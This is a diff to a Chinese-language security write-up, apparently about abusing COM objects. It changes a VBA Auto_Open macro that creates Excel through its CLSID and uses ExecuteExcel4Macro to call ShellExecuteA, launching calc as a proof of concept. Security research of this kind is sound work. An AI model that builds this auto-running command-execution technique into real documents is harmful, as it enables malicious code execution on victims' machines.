@@ -361,8 +361,9 @@ ForEach($CLSID in Get-Content $inputFilename) {
 &emsp;&emsp;于是使用ExecuteExcel4Macro函数加载shell32.dll中的ShellExecuteA成功起calc：
 
 ```vbscript
-Sub AutuOpen()
-ExecuteExcel4Macro "CALL(""shell32"", ""ShellExecuteA"", ""JJJCJJH"", -1, 0, ""CALC"", 0, 0, 5)"
+Sub Auto_Open()
+Set execl = GetObject("new:00020812-0000-0000-C000-000000000046")
+execl.ExecuteExcel4Macro ("CALL(""shell32"", ""ShellExecuteA"", ""JJJCJJH"", -1, 0, ""CALC"", 0, 0, 5)")
 End Sub
 ```
 
